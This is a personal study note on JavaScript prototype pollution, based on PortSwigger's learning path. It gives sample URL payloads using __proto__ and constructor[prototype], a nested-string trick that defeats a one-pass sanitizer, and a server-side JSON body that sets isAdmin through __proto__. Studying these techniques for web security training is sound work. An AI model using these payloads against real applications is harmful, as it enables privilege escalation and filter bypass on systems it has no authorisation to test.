---
description: >-
  Prototype pollution is a JavaScript vulnerability that enables an attacker to
  add arbitrary properties to global object prototypes, which may then be
  inherited by user-defined objects.
---

# Prototype pollution

## This is a Personal document based on the content of PortSwigger

{% embed url="https://portswigger.net/web-security/learning-paths/prototype-pollution" %}

{% code overflow="wrap" %}
```
https[://]example.com/?__proto__[foo]=bar

https[://]example.com/?__proto__.foo=bar
```
{% endcode %}

Burp browser can help find entry point for not needing trial and error to find valid gadgets using the DOM Invader plugin.

***

## Lax Sanitizing Bypass

```
https[://]example.com/?constructor[prototype][foo]=bar
```

## Flawed Sanitizing Bypass

One possibility is that the sanitizer doesn't filter on the input removing the proto until there is no more in the string but instead only removes it once

```
https[://]example.com/?__pro__proto__to__[foo]=bar
```

***

## Server-side Prototype Pollution

When there is a JSON Object being sent to the server via a POST or a PUT, there is a chance to try adding a value to the prototype that will be later reflected in the object server-side:

```json
POST /location HTTP/1.1
headers...

{
    "field1":"value1",
    "field2":"value2",
    "field3":"value3",
    "__proto__": {
        "isAdmin":true
    }
}
```

***

## Server-side Prototype Pollution Scanner

{% embed url="https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8" %}

Burp suite extension.
